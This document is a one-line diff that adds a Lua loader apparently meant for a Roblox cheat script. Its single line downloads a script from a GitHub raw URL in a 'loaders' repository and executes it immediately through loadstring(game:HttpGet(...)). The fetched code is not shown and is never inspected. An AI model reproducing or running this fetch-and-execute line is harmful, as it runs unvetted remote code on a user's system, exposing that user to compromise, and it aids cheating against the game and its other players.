@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/fps-flick-spam0-ehzgt1hboen9fl.lua"))()
